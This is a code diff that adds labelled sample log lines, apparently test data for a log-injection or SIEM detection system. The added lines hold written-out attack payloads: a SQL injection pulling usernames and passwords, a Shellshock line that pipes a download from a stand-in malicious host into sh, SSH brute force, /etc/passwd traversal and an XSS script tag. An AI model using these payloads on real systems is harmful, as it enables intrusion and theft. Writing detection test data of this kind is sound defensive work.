@@ -314,6 +314,56 @@ const SAMPLE_LOGS: SampleLog[] = [
     shortDescription: 'DAN-style jailbreak attempt via webhook.',
     difficulty: 'MEDIUM',
     attackVector: 'JAILBREAK'
+  },
+  {
+    id: 'i-siem-001',
+    source: 'nginx-access',
+    raw: '192.168.1.10 - - [10/Jun/2026:10:00:00 +0000] "GET /api/users?id=1%20UNION%20SELECT%20username%2Cpassword%20FROM%20users HTTP/1.1" 200 4523 "-" "Mozilla/5.0"',
+    label: 'INJECTED',
+    expectedCategory: 'SQL_INJECTION',
+    shortDescription: 'Classic union-based SQL Injection in URL parameter.',
+    difficulty: 'EASY',
+    attackVector: 'SQL_INJECTION'
+  },
+  {
+    id: 'i-siem-002',
+    source: 'apache-error',
+    raw: '192.168.1.50 - - [10/Jun/2026:10:05:00 +0000] "POST /upload HTTP/1.1" 400 120 "-" "() { :;}; /bin/bash -c \'curl http://malicious.com/shell | sh\'"',
+    label: 'INJECTED',
+    expectedCategory: 'COMMAND_INJECTION',
+    shortDescription: 'Shellshock/Command Injection via User-Agent.',
+    difficulty: 'MEDIUM',
+    attackVector: 'COMMAND_INJECTION'
+  },
+  {
+    id: 'i-siem-003',
+    source: 'linux-auth',
+    raw: 'May  4 09:15:22 server-01 sshd[1234]: Failed password for invalid user admin from 192.168.1.100 port 49123 ssh2 (15 attempts in 2s)',
+    label: 'INJECTED',
+    expectedCategory: 'BRUTE_FORCE',
+    shortDescription: 'Brute force credential stuffing attempt.',
+    difficulty: 'EASY',
+    attackVector: 'BRUTE_FORCE'
+  },
+  {
+    id: 'i-siem-004',
+    source: 'nginx-access',
+    raw: '10.0.0.5 - - [10/Jun/2026:10:15:00 +0000] "GET /download.php?file=../../../../etc/passwd HTTP/1.1" 200 1254 "-" "curl/7.68.0"',
+    label: 'INJECTED',
+    expectedCategory: 'PATH_TRAVERSAL',
+    shortDescription: 'Directory traversal sequence targeting /etc/passwd.',
+    difficulty: 'MEDIUM',
+    attackVector: 'PATH_TRAVERSAL'
+  },
+  {
+    id: 'i-siem-005',
+    source: 'waf-log',
+    raw: '192.168.1.50 - - [10/Jun/2026:10:20:00 +0000] "GET /search?q=<script>alert(\'XSS\')</script> HTTP/1.1" 200 452',
+    label: 'INJECTED',
+    expectedCategory: 'CROSS_SITE_SCRIPTING',
+    shortDescription: 'Reflected Cross-site Scripting (XSS) payload.',
+    difficulty: 'EASY',
+    attackVector: 'CROSS_SITE_SCRIPTING'
   }
 ];
 
